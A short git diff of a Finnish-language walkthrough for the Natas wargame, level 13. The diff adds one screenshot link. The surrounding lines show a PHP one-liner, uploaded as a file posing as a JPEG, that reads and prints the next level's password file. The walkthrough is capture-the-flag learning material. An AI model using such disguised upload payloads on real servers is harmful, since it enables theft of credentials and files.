@@ -430,6 +430,8 @@ image1.php: JPEG image data
 <?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>                                                                                                                         
 ```
 
+![alt text](./kuvat-level11-15/natas13-18.png)
+
 Pysytään yhä Kali linux desktopissa ja suoritettaan tämä prosessi viimeisenä, ja huomioina tiedoston nimi pitää olla tasalleen tarkka.
 
 ```
